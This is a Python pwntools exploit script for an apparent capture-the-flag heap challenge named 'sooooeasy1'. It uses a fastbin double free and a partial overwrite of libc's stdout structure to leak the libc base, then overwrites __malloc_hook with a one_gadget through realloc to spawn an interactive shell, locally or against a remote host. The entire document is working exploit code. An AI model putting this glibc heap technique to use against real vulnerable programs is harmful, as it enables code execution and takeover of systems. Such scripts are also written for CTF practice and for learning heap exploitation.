#! /usr/bin/env python3
from pwn import *

def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Your choice : ')

def add(size, name, message):
    eat()
    p.sendline('1')
    p.recvuntil('your name: ')
    p.sendline(str(size))
    p.recvuntil('Your name:')
    p.send(name)
    p.recvuntil('Your message:')
    p.sendline(message)

def dele(idx):
    eat()
    p.sendline('2')
    p.recvuntil("mumber's index:")
    p.sendline(str(idx))

while True:
    try:
        arch = 64
        challenge = './sooooeasy1'

        context.os='linux'
        context.log_level = 'debug'
        if arch==64:
            context.arch='amd64'
        if arch==32:
            context.arch='i386'
        context.terminal = ['tmux', 'splitw', '-h']
        elf = ELF(challenge)
        libc = ELF('libc-2.23.so')

        local = 1
        if local:
            p = process(challenge)
        else:
            p = remote('chuj.top', '53178')
        
        _IO_2_1_stdout_ = libc.symbols["_IO_2_1_stdout_"]
        log.success('_IO_2_1_stdout_: ' + hex(_IO_2_1_stdout_))
        stdout_4low = 0x25dd

        # add(0x98, name, message)
        
        add(0x68, 'a', 'mess')# 0
        add(0x98, 'a', 'mess')# 1
        add(0x68, 'a', 'mess')# 2
        add(0x68, 'a', 'mess')# 3
        
        dele(1)
        
        add(0x68, p16(stdout_4low), 'mess')# 4
        
        #! double free
        dele(0)
        dele(2)
        dele(0)
        
        
        add(0x68, p8(0x00), 'mess')# 5
        
        #* 申请出三个 useless chunk
        add(0x68, 'a', 'mess')# 6
        add(0x68, 'a', 'mess')# 7
        add(0x68, 'a', 'mess')# 8
        
        payload = b"\x00" * 0x33 + p64(0x0FBAD1800) + p64(0)*3 + p8(0x58)
        
        eat()
        p.sendline('1')# 9
        p.recvuntil('your name: \n')
        p.sendline(str(0x68))
        p.recvuntil('Your name:\n')
        p.send(payload)

        libc.address = u64(p.recv(8)) - 0x3c56a3
        log.success("libc.address: " + hex(libc.address))
        malloc_hook = libc.symbols["__malloc_hook"]
        log.success("malloc_hook: "+hex(malloc_hook))
        realloc_addr = libc.symbols["realloc"]
        log.success("realloc_addr: "+hex(realloc_addr))
        realloc_hook = malloc_hook - 0x8
        log.success('realloc_hook: ' + hex(realloc_hook))
        
        p.recvuntil('Your message:')
        p.sendline('mess')
        
        dele(0)
        dele(2)
        dele(0)
        
        add(0x68, p64(malloc_hook-0x23), 'mess')# 10
        add(0x68, 'a', 'mess')# 11
        add(0x68, 'a', 'mess')# 12
        
        one_array = [0x45216,0x4526a,0xf02a4,0xf1147]
        one_gadget = libc.address + one_array[2]
        # payload = b'a' * 0x13 + p64(one_gadget)
        payload = b'a'*0x0b + p64(one_gadget) + p64(realloc_addr+0x10)
        
        add(0x68, payload, 'mess')# 13
        
        eat()
        p.sendline('1')
        
    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        break
